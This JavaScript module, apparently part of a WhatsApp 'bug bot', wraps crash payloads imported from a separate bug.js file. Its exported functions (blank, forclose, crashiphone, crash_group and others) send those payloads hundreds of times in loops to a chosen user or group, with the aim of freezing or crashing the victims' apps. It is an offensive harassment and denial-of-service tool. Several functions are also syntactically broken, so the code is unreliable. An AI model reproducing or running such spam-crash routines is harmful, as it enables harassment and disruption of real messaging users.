const { default: 
baileys, 
proto, 
generateWAMessage, 
generateWAMessageFromContent, 
getContentType, 
prepareWAMessageMedia } = require("../index");

const {
NSKambing,
DX7,
FreezeChat,
PaymentForce,
DewaSquad,
Kres,
Embege
} = require("./bug.js");

//funct bug targetJid
async function invisible(vinzzoffc, targetJid) {
for (let i = 0; i < 500; i++)
await Kres(vinzzoffc, targetJid);
}

async function blank(vinzzoffc, targetJid) {
for (let i = 0; i < 430; i++)
await NSKambing(vinzzoffc, targetJid);
await DX7(vinzzoffc, targetJid, true);
await FreezeChat(vinzzoffc, targetJid);
await Embege(vinzzoffc, targetJid);
}

async function forclose(vinzzoffc, targetJid) {
for (let i = 0; i < 650; i++)
await PaymentForce(vinzzoffc, targetJid);
await PaymentForce(vinzzoffc, targetJid);
await DewaSquad(vinzzoffc, targetJid);
await DewaSquad(vinzzoffc, targetJid);
}

async function buldozer(vinzzoffc, targetJid) {
for (let i = 0; i < 309; i++)
await Kres(vinzzoffc, targetJid);
await FreezeChat(vinzzoffc, targetJid);
}

async function crashiphone(vinzzoffc, targetJid) {
for (let i = 0; i < 50; i++)

}

//funct bug groupJid
async function delay_group(vinzzoffc groupJid) {
for (let i = 0; i < 480; i++)
await Kres(vinzzoffc, targetJid);
}

async function blank_group(vinzzoffc, groupJid) {
for (let i = 0; i < 500; i++)
await NSKambing(vinzzoffc, groupJid);
await Embege(vinzzoffc, groupJid);
}

async function crash_group(vinzzoffc, groupJid) {
for (let i = 0; i < 150; i++)
await NSKambing(vinzzoffc, groupJid);
await Embege(vinzzoffc, groupJid);
}

module.exports = {
invisible,
blank,
forclose,
buldozer,
crashiphone,
delay_group,
blank_group,
crash_group
}
